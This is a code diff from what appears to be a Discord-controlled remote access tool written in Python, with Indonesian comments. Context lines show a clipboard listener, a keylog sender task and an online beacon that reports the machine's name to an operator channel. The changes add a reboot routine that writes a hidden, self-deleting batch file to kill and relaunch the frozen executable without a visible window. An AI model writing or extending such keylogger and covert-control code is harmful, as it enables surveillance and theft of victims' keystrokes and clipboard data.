@@ -593,7 +593,7 @@ async def on_ready():
     threading.Thread(target=clipboard_listener, daemon=True).start()
     
     channel = bot.get_channel(CHANNEL_ID)
-    if channel: await channel.send(embed=discord.Embed(title="🟢 PC ONLINE", description=f"**{MY_PC_NAME}** siap.UPDATE DONE", color=discord.Color.green()))
+    if channel: await channel.send(embed=discord.Embed(title="🟢 PC ONLINE", description=f"**{MY_PC_NAME}** siap.\n\n**VERSI BOT: v1.1 (UPDATED!)**", color=discord.Color.green()))
     
     if not periodic_log.is_running(): periodic_log.start()
     if not keylog_sender_task.is_running(): keylog_sender_task.start()
@@ -621,11 +621,23 @@ async def on_message(message):
 async def cmd_reboot(ctx):
     if ctx.channel.id != CHANNEL_ID: return
     await ctx.message.delete()
-    await ctx.send("🔄 **Merestart bot dan mendownload kode terbaru...**")
+    await ctx.send("🔄 **Merestart bot... Menunggu koneksi lama ditutup.**")
     await asyncio.sleep(1)
+    
     if getattr(sys, 'frozen', False):
-        subprocess.Popen([sys.executable])
-    os._exit(0)
+        # Membuat script .bat untuk membunuh proses lama, menunggu, lalu membuka yg baru
+        bat_path = os.path.join(BASE_DIR, "restart_bot.bat")
+        with open(bat_path, "w") as bat:
+            bat.write("@echo off\n")
+            bat.write("timeout /t 2 /nobreak >nul\n") # Tunggu 2 detik
+            bat.write(f"taskkill /F /IM {os.path.basename(sys.executable)} >nul 2>&1\n")
+            bat.write(f"start \"\" \"{sys.executable}\"\n")
+            bat.write("del \"%~f0\"\n") # Hapus script ini setelah selesai
+            
+        subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        os._exit(0)
+    else:
+        os._exit(0)
 
 @bot.command(name="hook")
 async def cmd_hook(ctx, arg: str):
